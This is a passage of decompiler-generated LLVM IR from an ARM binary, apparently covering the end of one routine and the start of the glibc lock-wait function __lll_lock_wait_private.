  store i1 %v3_151d0, i1* %cpsr_c.global-to-local, align 1
  %v9_151d0 = icmp eq i32 %v0_151d0, %v1_151d0
  store i32 %v2_15178, i32* %r4.global-to-local, align 4
  br i1 %v9_151d0, label %dec_label_pc_15168, label %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge

dec_label_pc_151d0.dec_label_pc_1519c_crit_edge:  ; preds = %dec_label_pc_151d0
  %v0_1519c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_151a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1519c

dec_label_pc_151ec:                               ; preds = %dec_label_pc_151e0.backedge, %entry
  %v0_151f431 = phi i32 [ ptrtoint (i32* @global_var_23010.367 to i32), %entry ], [ %v0_151e0, %dec_label_pc_151e0.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151f0

dec_label_pc_151f0.loopexit:                      ; preds = %bb72
  store i32 %v2_15178, i32* %r6.global-to-local, align 4
  %v0_151f4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151f0.loopexit, %dec_label_pc_151ec
  %v0_151f4 = phi i32 [ %v0_151f4.pre, %dec_label_pc_151f0.loopexit ], [ %v0_151f431, %dec_label_pc_151ec ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_151f4 = add i32 %v0_151f4, 152
  %v3_151f4 = inttoptr i32 %v2_151f4 to i32*
  %v4_151f4 = load i32, i32* %v3_151f4, align 4
  store i32 %v4_151f4, i32* %r7.global-to-local, align 4
  %v0_151f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_151f8, i32* %r0.global-to-local, align 4
  %v1_151fc = add i32 %v4_151f4, 8
  %v2_151fc = inttoptr i32 %v1_151fc to i32*
  %v3_151fc = load i32, i32* %v2_151fc, align 4
  store i32 %v3_151fc, i32* %r3.global-to-local, align 4
  %v1_15200 = add i32 %v0_151f8, -1168
  store i32 %v1_15200, i32* %r5.global-to-local, align 4
  %v3_15204 = icmp uge i32 %v3_151fc, %v1_15200
  store i1 %v3_15204, i1* %cpsr_c.global-to-local, align 1
  %v9_15204 = icmp eq i32 %v3_151fc, %v1_15200
  br i1 %v9_15204, label %dec_label_pc_1536c, label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151f0
  store i32 %v4_151f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15218112 = inttoptr i32 %v4_151f4 to i32*
  %v2_15218113 = load i32, i32* %v1_15218112, align 4
  store i32 %v2_15218113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1521c115 = icmp eq i32 %v2_15218113, 0
  br i1 %v9_1521c115, label %dec_label_pc_15224, label %dec_label_pc_1523c

dec_label_pc_15224:                               ; preds = %dec_label_pc_1520c, %dec_label_pc_15224.dec_label_pc_15218_crit_edge
  %v0_15224116 = phi i32 [ %v1_1521c.pre, %dec_label_pc_15224.dec_label_pc_15218_crit_edge ], [ 0, %dec_label_pc_1520c ]
  store i32 %v0_15224116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15234 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15234, label %dec_label_pc_15238, label %dec_label_pc_15224.dec_label_pc_15218_crit_edge

dec_label_pc_15224.dec_label_pc_15218_crit_edge:  ; preds = %dec_label_pc_15224
  %v0_15218.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1521c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15218 = inttoptr i32 %v0_15218.pre to i32*
  %v2_15218 = load i32, i32* %v1_15218, align 4
  store i32 %v2_15218, i32* %r3.global-to-local, align 4
  %v3_1521c = icmp uge i32 %v2_15218, %v1_1521c.pre
  store i1 %v3_1521c, i1* %cpsr_c.global-to-local, align 1
  %v9_1521c = icmp eq i32 %v2_15218, %v1_1521c.pre
  br i1 %v9_1521c, label %dec_label_pc_15224, label %dec_label_pc_1523c

dec_label_pc_15238:                               ; preds = %dec_label_pc_15224
  %v0_15238 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15238, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1523c

dec_label_pc_1523c:                               ; preds = %dec_label_pc_1520c, %dec_label_pc_15224.dec_label_pc_15218_crit_edge, %dec_label_pc_15238
  %v0_1523c = phi i32 [ %v0_15238, %dec_label_pc_15238 ], [ %v2_15218113, %dec_label_pc_1520c ], [ %v2_15218, %dec_label_pc_15224.dec_label_pc_15218_crit_edge ]
  %v1_1523c = phi i32 [ %v0_15238, %dec_label_pc_15238 ], [ 0, %dec_label_pc_1520c ], [ %v1_1521c.pre, %dec_label_pc_15224.dec_label_pc_15218_crit_edge ]
  %v3_1523c = icmp uge i32 %v0_1523c, %v1_1523c
  store i1 %v3_1523c, i1* %cpsr_c.global-to-local, align 1
  %v9_1523c = icmp eq i32 %v0_1523c, %v1_1523c
  br i1 %v9_1523c, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_1523c
  %v1_15240 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15240, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_1523c, %bb73
  %v1_15244 = xor i1 %v9_1523c, true
  call void @__pseudo_cond_branch(i1 %v1_15244, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_15248 = load i32, i32* %r5.global-to-local, align 4
  %v1_15248 = load i32, i32* %r7.global-to-local, align 4
  %v2_15248 = add i32 %v1_15248, 8
  %v3_15248 = inttoptr i32 %v2_15248 to i32*
  store i32 %v0_15248, i32* %v3_15248, align 4
  br label %dec_label_pc_1536c

dec_label_pc_1536c:                               ; preds = %bb74, %dec_label_pc_151f0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15250 = load i32, i32* %r8.global-to-local, align 4
  %v2_15250 = add i32 %v0_15250, 152
  %v3_15250 = inttoptr i32 %v2_15250 to i32*
  %v4_15250 = load i32, i32* %v3_15250, align 4
  store i32 %v4_15250, i32* %r2.global-to-local, align 4
  %v1_15254 = add i32 %v4_15250, 4
  %v2_15254 = inttoptr i32 %v1_15254 to i32*
  %v3_15254 = load i32, i32* %v2_15254, align 4
  %v1_15258 = add i32 %v3_15254, 1
  store i32 %v1_15258, i32* %r3.global-to-local, align 4
  store i32 %v1_15258, i32* %v2_15254, align 4
  %v0_15260 = load i32, i32* %r5.global-to-local, align 4
  %v1_15260 = add i32 %v0_15260, 108
  %v2_15260 = inttoptr i32 %v1_15260 to i32*
  %v3_15260 = load i32, i32* %v2_15260, align 4
  store i32 %v3_15260, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_15268 = sub i32 0, %v3_15260
  store i32 %v1_15268, i32* %v2_15260, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_1527c = load i32, i32* %r5.global-to-local, align 4
  %v1_1527c = add i32 %v0_1527c, 104
  store i32 %v1_1527c, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_15370.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15370 = add i32 %v0_1527c, 108
  %v3_15370 = inttoptr i32 %v2_15370 to i32*
  store i32 %v0_15370.pre, i32* %v3_15370, align 4
  %v0_15374 = load i32, i32* %r8.global-to-local, align 4
  %v1_15374 = load i32, i32* %r3.global-to-local, align 4
  %v2_15374 = add i32 %v1_15374, %v0_15374
  %v3_15374 = inttoptr i32 %v2_15374 to i32*
  %v4_15374 = load i32, i32* %v3_15374, align 4
  store i32 %v4_15374, i32* %r0.global-to-local, align 4
  %v1_15378 = add i32 %v4_15374, 4
  %v2_15378 = inttoptr i32 %v1_15378 to i32*
  %v3_15378 = load i32, i32* %v2_15378, align 4
  %v1_1537c = add i32 %v3_15378, -1
  store i32 %v1_1537c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15380 = icmp eq i32 %v1_1537c, 0
  store i32 %v1_1537c, i32* %v2_15378, align 4
  br i1 %v2_15380, label %dec_label_pc_1538c, label %dec_label_pc_1547cthread-pre-split

dec_label_pc_1538c:                               ; preds = %dec_label_pc_1536c
  %v0_1538c = load i32, i32* %r3.global-to-local, align 4
  %v1_1538c = load i32, i32* %r0.global-to-local, align 4
  %v2_1538c = add i32 %v1_1538c, 8
  %v3_1538c = inttoptr i32 %v2_1538c to i32*
  store i32 %v0_1538c, i32* %v3_1538c, align 4
  %v0_15390 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15390, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %dec_label_pc_153c4.dec_label_pc_15394_crit_edge, %dec_label_pc_1538c
  %v0_15394 = phi i32 [ %v0_15394.pre, %dec_label_pc_153c4.dec_label_pc_15394_crit_edge ], [ %v0_15390, %dec_label_pc_1538c ]
  %v1_15394 = inttoptr i32 %v0_15394 to i32*
  %v2_15394 = load i32, i32* %v1_15394, align 4
  store i32 %v2_15394, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15394, i32* %r2.global-to-local, align 4
  %v2_153a0100 = load i32, i32* %v1_15394, align 4
  store i32 %v2_153a0100, i32* %r3.global-to-local, align 4
  %v3_153a4102 = icmp uge i32 %v2_153a0100, %v2_15394
  store i1 %v3_153a4102, i1* %cpsr_c.global-to-local, align 1
  %v9_153a4108 = icmp eq i32 %v2_153a0100, %v2_15394
  br i1 %v9_153a4108, label %dec_label_pc_153ac, label %dec_label_pc_153c4

dec_label_pc_153ac:                               ; preds = %dec_label_pc_15394, %dec_label_pc_153ac.dec_label_pc_153a0_crit_edge
  %v0_153ac109 = phi i32 [ %v1_153a4.pre, %dec_label_pc_153ac.dec_label_pc_153a0_crit_edge ], [ %v2_15394, %dec_label_pc_15394 ]
  store i32 %v0_153ac109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_153bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153bc, label %dec_label_pc_153c0, label %dec_label_pc_153ac.dec_label_pc_153a0_crit_edge

dec_label_pc_153ac.dec_label_pc_153a0_crit_edge:  ; preds = %dec_label_pc_153ac
  %v0_153a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_153a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_153a0 = inttoptr i32 %v0_153a0.pre to i32*
  %v2_153a0 = load i32, i32* %v1_153a0, align 4
  store i32 %v2_153a0, i32* %r3.global-to-local, align 4
  %v3_153a4 = icmp uge i32 %v2_153a0, %v1_153a4.pre
  store i1 %v3_153a4, i1* %cpsr_c.global-to-local, align 1
  %v9_153a4 = icmp eq i32 %v2_153a0, %v1_153a4.pre
  br i1 %v9_153a4, label %dec_label_pc_153ac, label %dec_label_pc_153c4

dec_label_pc_153c0:                               ; preds = %dec_label_pc_153ac
  %v0_153c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_153c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %dec_label_pc_15394, %dec_label_pc_153ac.dec_label_pc_153a0_crit_edge, %dec_label_pc_153c0
  %v0_153cc = phi i32 [ %v0_153c0, %dec_label_pc_153c0 ], [ %v2_153a0100, %dec_label_pc_15394 ], [ %v2_153a0, %dec_label_pc_153ac.dec_label_pc_153a0_crit_edge ]
  %v1_153c4 = phi i32 [ %v0_153c0, %dec_label_pc_153c0 ], [ %v2_15394, %dec_label_pc_15394 ], [ %v1_153a4.pre, %dec_label_pc_153ac.dec_label_pc_153a0_crit_edge ]
  %v3_153c4 = icmp uge i32 %v0_153cc, %v1_153c4
  store i1 %v3_153c4, i1* %cpsr_c.global-to-local, align 1
  %v9_153c4 = icmp eq i32 %v0_153cc, %v1_153c4
  br i1 %v9_153c4, label %dec_label_pc_153cc, label %dec_label_pc_153c4.dec_label_pc_15394_crit_edge

dec_label_pc_153c4.dec_label_pc_15394_crit_edge:  ; preds = %dec_label_pc_153c4
  %v0_15394.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15394

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153c4
  %v2_153cc = icmp ne i32 %v1_153c4, 0
  store i1 %v2_153cc, i1* %cpsr_c.global-to-local, align 1
  %v7_153d0 = icmp slt i32 %v1_153c4, 2
  br i1 %v7_153d0, label %dec_label_pc_1547cthread-pre-split, label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153cc
  %v0_153d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_153d4, i32* %r0.global-to-local, align 4
  %v0_153d8 = load i32, i32* @r1, align 4
  %v1_153d8 = add i32 %v0_153d8, 129
  store i32 %v1_153d8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1547cthread-pre-split

dec_label_pc_153f0:                               ; preds = %dec_label_pc_1547cthread-pre-split, %dec_label_pc_15478
  %v0_153f0 = phi i32 [ %v3_15478, %dec_label_pc_15478 ], [ %v0_1547c.pr, %dec_label_pc_1547cthread-pre-split ]
  %v1_153f0 = inttoptr i32 %v0_153f0 to i32*
  %v2_153f0 = load i32, i32* %v1_153f0, align 4
  store i32 %v2_153f0, i32* %r3.global-to-local, align 4
  %v1_153f4 = add i32 %v2_153f0, 8
  %v2_153f4 = inttoptr i32 %v1_153f4 to i32*
  %v3_153f4 = load i32, i32* %v2_153f4, align 4
  store i32 %v3_153f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153f8 = icmp eq i32 %v3_153f4, 0
  br i1 %v2_153f8, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_153f0
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_153f0, %bb75
  %v2_15400 = xor i1 %v2_153f8, true
  call void @__pseudo_cond_branch(i1 %v2_15400, i32 %v3_153f4)
  %v0_15404 = load i32, i32* %r6.global-to-local, align 4
  %v1_15404 = inttoptr i32 %v0_15404 to i32*
  %v2_15404 = load i32, i32* %v1_15404, align 4
  store i32 %v2_15404, i32* %r5.global-to-local, align 4
  %v1_15408 = add i32 %v2_15404, 20
  store i32 %v1_15408, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %dec_label_pc_15440.dec_label_pc_1540c_crit_edge, %bb76
  %v0_15410 = phi i32 [ %v0_15410.pre, %dec_label_pc_15440.dec_label_pc_1540c_crit_edge ], [ %v1_15408, %bb76 ]
  %v0_1540c = phi i32 [ %v0_1540c.pre, %dec_label_pc_15440.dec_label_pc_1540c_crit_edge ], [ %v2_15404, %bb76 ]
  %v1_1540c = add i32 %v0_1540c, 20
  %v2_1540c = inttoptr i32 %v1_1540c to i32*
  %v3_1540c = load i32, i32* %v2_1540c, align 4
  store i32 %v0_15410, i32* %r2.global-to-local, align 4
  store i32 %v3_1540c, i32* %r4.global-to-local, align 4
  %v1_15418 = add i32 %v3_1540c, -1
  store i32 %v1_15418, i32* @r1, align 4
  %v1_1541c87 = inttoptr i32 %v0_15410 to i32*
  %v2_1541c88 = load i32, i32* %v1_1541c87, align 4
  store i32 %v2_1541c88, i32* %r3.global-to-local, align 4
  %v3_1542090 = icmp uge i32 %v2_1541c88, %v3_1540c
  store i1 %v3_1542090, i1* %cpsr_c.global-to-local, align 1
  %v9_1542096 = icmp eq i32 %v2_1541c88, %v3_1540c
  br i1 %v9_1542096, label %dec_label_pc_15428, label %dec_label_pc_15440

dec_label_pc_15428:                               ; preds = %dec_label_pc_1540c, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge
  %v0_1542897 = phi i32 [ %v1_15420.pre, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge ], [ %v3_1540c, %dec_label_pc_1540c ]
  store i32 %v0_1542897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15438 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15438, label %dec_label_pc_1543c, label %dec_label_pc_15428.dec_label_pc_1541c_crit_edge

dec_label_pc_15428.dec_label_pc_1541c_crit_edge:  ; preds = %dec_label_pc_15428
  %v0_1541c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15420.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1541c = inttoptr i32 %v0_1541c.pre to i32*
  %v2_1541c = load i32, i32* %v1_1541c, align 4
  store i32 %v2_1541c, i32* %r3.global-to-local, align 4
  %v3_15420 = icmp uge i32 %v2_1541c, %v1_15420.pre
  store i1 %v3_15420, i1* %cpsr_c.global-to-local, align 1
  %v9_15420 = icmp eq i32 %v2_1541c, %v1_15420.pre
  br i1 %v9_15420, label %dec_label_pc_15428, label %dec_label_pc_15440

dec_label_pc_1543c:                               ; preds = %dec_label_pc_15428
  %v0_1543c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1543c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_1540c, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge, %dec_label_pc_1543c
  %v0_1544c = phi i32 [ %v0_1543c, %dec_label_pc_1543c ], [ %v2_1541c88, %dec_label_pc_1540c ], [ %v2_1541c, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge ]
  %v1_15440 = phi i32 [ %v0_1543c, %dec_label_pc_1543c ], [ %v3_1540c, %dec_label_pc_1540c ], [ %v1_15420.pre, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge ]
  %v3_15440 = icmp uge i32 %v0_1544c, %v1_15440
  store i1 %v3_15440, i1* %cpsr_c.global-to-local, align 1
  %v9_15440 = icmp eq i32 %v0_1544c, %v1_15440
  store i32 %v0_1544c, i32* %r2.global-to-local, align 4
  br i1 %v9_15440, label %dec_label_pc_1544c, label %dec_label_pc_15440.dec_label_pc_1540c_crit_edge

dec_label_pc_15440.dec_label_pc_1540c_crit_edge:  ; preds = %dec_label_pc_15440
  %v0_1540c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15410.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1540c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_15440
  %v2_1544c = icmp ne i32 %v1_15440, 0
  store i1 %v2_1544c, i1* %cpsr_c.global-to-local, align 1
  %v7_1544c = icmp eq i32 %v1_15440, 1
  %v0_15454 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_1544c, label %dec_label_pc_15454, label %dec_label_pc_15478

dec_label_pc_15454:                               ; preds = %dec_label_pc_1544c
  %v1_15454 = inttoptr i32 %v0_15454 to i32*
  %v2_15454 = load i32, i32* %v1_15454, align 4
  store i32 %v2_15454, i32* @r1, align 4
  %v1_15458 = add i32 %v2_15454, 24
  %v2_15458 = inttoptr i32 %v1_15458 to i32*
  %v3_15458 = load i32, i32* %v2_15458, align 4
  store i32 %v3_15458, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1545c = icmp eq i32 %v3_15458, 0
  br i1 %v2_1545c, label %dec_label_pc_15478, label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %dec_label_pc_15454
  %v1_15464 = add i32 %v2_15454, 20
  %v2_15464 = inttoptr i32 %v1_15464 to i32*
  %v3_15464 = load i32, i32* %v2_15464, align 4
  store i32 %v3_15464, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15478

dec_label_pc_15478:                               ; preds = %dec_label_pc_1544c, %dec_label_pc_15464, %dec_label_pc_15454
  %v1_15478 = add i32 %v0_15454, 4
  %v2_15478 = inttoptr i32 %v1_15478 to i32*
  %v3_15478 = load i32, i32* %v2_15478, align 4
  store i32 %v3_15478, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1547c = icmp eq i32 %v3_15478, 0
  br i1 %v2_1547c, label %dec_label_pc_15484, label %dec_label_pc_153f0

dec_label_pc_1547cthread-pre-split:               ; preds = %dec_label_pc_153d4, %dec_label_pc_153cc, %dec_label_pc_1536c
  %v0_1547c.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1547c11 = icmp eq i32 %v0_1547c.pr, 0
  br i1 %v2_1547c11, label %dec_label_pc_15484, label %dec_label_pc_153f0

dec_label_pc_15484:                               ; preds = %dec_label_pc_15478, %dec_label_pc_1547cthread-pre-split
  %v0_15484.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15484.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_15484.pre

; uselistorder directives
  uselistorder i32 %v0_1547c.pr, { 1, 0 }
  uselistorder i32 %v3_15478, { 1, 2, 0 }
  uselistorder i32 %v1_15440, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1543c, { 1, 0, 2 }
  uselistorder i32 %v1_15420.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_153c0, { 1, 0, 2 }
  uselistorder i32 %v1_153a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15394, { 1, 0 }
  uselistorder i32 %v0_15238, { 1, 0, 2 }
  uselistorder i32 %v1_1521c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_151f4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_151cc, { 1, 0, 2 }
  uselistorder i32 %v1_151b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_15178, { 1, 0, 2 }
  uselistorder i32 %v0_15158, { 1, 0, 2 }
  uselistorder i32 %v1_1513c.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 5, 6, 8, 7, 4, 9, 10, 11, 12, 14, 13, 2, 15, 16, 17, 18, 19, 20, 21, 23, 22, 3, 24, 25, 26, 28, 27, 1, 29, 30, 32, 31, 0, 33 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 11, 6, 7, 8, 9, 31, 32, 10, 12, 13, 15, 14, 0, 16, 17, 19, 18, 3, 20, 21, 23, 22, 1, 24, 25, 26, 28, 27, 2, 30, 29, 5 }
  uselistorder i32 108, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15484, { 1, 0 }
  uselistorder label %dec_label_pc_15478, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15440, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15428, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_153c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_153ac, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1523c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15224, { 1, 0 }
  uselistorder label %dec_label_pc_151d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_151b8, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_1515c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15144, { 1, 0 }
  uselistorder label %dec_label_pc_151e0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15110, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_154bc = load i32, i32* @r4, align 4
  store i32 %v3_154bc, i32* %stack_var_-16, align 4
  %v0_154c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_154c0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_15544.dec_label_pc_154c4_crit_edge, %entry
  %v0_154c8 = phi i32 [ %v0_154c8.pre, %dec_label_pc_15544.dec_label_pc_154c4_crit_edge ], [ %v0_154c0, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_154c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_154d017 = inttoptr i32 %v0_154c8 to i32*
  %v2_154d018 = load i32, i32* %v1_154d017, align 4
  %v3_154d420 = icmp ne i32 %v2_154d018, 0
  store i1 %v3_154d420, i1* %cpsr_c.global-to-local, align 1
  %v9_154d426 = icmp eq i32 %v2_154d018, 1
  br i1 %v9_154d426, label %dec_label_pc_154dc, label %dec_label_pc_154f4

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154c4, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge
  %v0_154dc27 = phi i32 [ %v1_154d4.pre, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge ], [ 1, %dec_label_pc_154c4 ]
  store i32 %v0_154dc27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_154ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_154ec, label %dec_label_pc_154f0, label %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge

dec_label_pc_154dc.dec_label_pc_154d0_crit_edge:  ; preds = %dec_label_pc_154dc
  %v0_154d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_154d0 = inttoptr i32 %v0_154d0.pre to i32*
  %v2_154d0 = load i32, i32* %v1_154d0, align 4
  %v3_154d4 = icmp uge i32 %v2_154d0, %v1_154d4.pre
  store i1 %v3_154d4, i1* %cpsr_c.global-to-local, align 1
  %v9_154d4 = icmp eq i32 %v2_154d0, %v1_154d4.pre
  br i1 %v9_154d4, label %dec_label_pc_154dc, label %dec_label_pc_154f4

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154dc
  %v0_154f0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154c4, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge, %dec_label_pc_154f0
  %v0_154f4 = phi i32 [ %v0_154f0, %dec_label_pc_154f0 ], [ %v2_154d018, %dec_label_pc_154c4 ], [ %v2_154d0, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_154f4 = icmp eq i32 %v0_154f4, 0
  %v0_15518.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_154f4, label %dec_label_pc_15514, label %dec_label_pc_154fc

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154f4
  store i32 %v0_15518.pre, i32* %r0.global-to-local, align 4
  %v0_15500 = load i32, i32* %r1.global-to-local, align 4
  %v1_15500 = add i32 %v0_15500, 126
  store i32 %v1_15500, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15514

dec_label_pc_15514:                               ; preds = %dec_label_pc_154f4, %dec_label_pc_154fc
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_15518.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1552028 = inttoptr i32 %v0_15518.pre to i32*
  %v2_1552029 = load i32, i32* %v1_1552028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1552436 = icmp eq i32 %v2_1552029, 0
  br i1 %v9_1552436, label %dec_label_pc_1552c, label %dec_label_pc_15544

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15514, %dec_label_pc_1552c.dec_label_pc_15520_crit_edge
  %v0_1552c37 = phi i32 [ %v1_15524.pre, %dec_label_pc_1552c.dec_label_pc_15520_crit_edge ], [ 0, %dec_label_pc_15514 ]
  store i32 %v0_1552c37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1553c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1553c, label %dec_label_pc_15540, label %dec_label_pc_1552c.dec_label_pc_15520_crit_edge

dec_label_pc_1552c.dec_label_pc_15520_crit_edge:  ; preds = %dec_label_pc_1552c
